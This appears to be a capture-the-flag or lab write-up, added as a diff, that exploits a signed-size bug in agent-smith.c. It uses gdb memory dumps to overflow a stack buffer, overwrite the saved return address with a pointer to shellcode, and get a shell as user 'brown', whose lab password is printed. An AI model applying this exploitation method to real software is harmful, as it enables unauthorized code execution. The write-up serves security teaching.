@@ -1,0 +1,68 @@
+2. Compromising Further
+
+Vulnerability: In file agent-smith.c, line 8, 'size' is declared of type int8_t while 'size' passed to 'fread' in line 15 should be of type unsigned int. This creates a potential risk for passing 'size = -1' that can pass the size test but being interpreted as 'size = 4278190080' or whatever very large size that allows the attacker to overflow 'msg'.     
+
+Approach: pass 'size = \xff', interpreted as -1 in size test but as 4278190080 (0xff000000) in fread, overflow 'msg' till the eip of the previous stack frame and overwrite the eip with the address to the shellcode.
+
+Attack:
+
+Step 1. Find address of 'msg': Use gdb steppping over code lines until after 'msg' is initialized, then type 'print &msg[0]' to get 0xbffff898.
+
+Step 2. Identify the address of the eip of the previous frame: Type backtrace to get info about how many frames pushed up so far, type info frame 1 to expect the 'main' frame and see eip = 0x804857b as below:
+
+Stack frame at 0xbffff950:
+ eip = 0x804857b in main (agent-smith.c:26); saved eip 0xb7e454d3
+ caller of frame at 0xbffff930
+ source language c.
+ Arglist at 0xbffff948, args: argc=2, argv=0xbffff9e4
+ Locals at 0xbffff948, Previous frame's sp is 0xbffff950
+ Saved registers:
+  ebp at 0xbffff948, eip at 0xbffff94c
+
+This eip is the address of the next instruction to be executed.
+
+Step 3. Find the location of eip: type 'x/40xw 0xbffff898' to inspect the memory and find out that the eip lies at 0xbffff95c as below:
+
+0xbffff898:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff8a8:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff8b8:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff8c8:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff8d8:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff8e8:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff8f8:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff908:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff918:	0x0804a000	0x0804b008	0x00000002	0xbffff9e4
+0xbffff928:	0xbffff948	0x0804857b	0xbffffae7	0x00000000
+                       ^     ^
+                       |     |
+                0xbffff92c  eip
+
+From above, 0x0804857b is at the location offset 4 bytes from 0xbffff928. So eip is at 0xbffff92c.
+
+Step 4. Fill 'msg' with nonsense code from 0xbffff898 to 0xbffff92c. At 0xbffff92c, overwrite eip with 0xbffff930 that points to shellcode.
+
+0xbffff898:	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f
+0xbffff8a8:	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f
+0xbffff8b8:	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f
+0xbffff8c8:	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f
+0xbffff8d8:	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f
+0xbffff8e8:	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f
+0xbffff8f8:	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f
+0xbffff908:	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f
+0xbffff918:	0x000000c6	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f
+0xbffff928:	0x6f6f6f6f	0xbffff930	0x895e1feb	0xc0310876
+                           ^       ^
+                           |       |
+                        new_eip   shellcode starts from here
+
+Result:
+
+smith@pwnable:~$ invoke ./exploit 
+oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo�
+$ whoami
+brown
+$ cat README
+Never send a human to do a machine's job.
+
+user: brown
+pass: Zsps7Z):
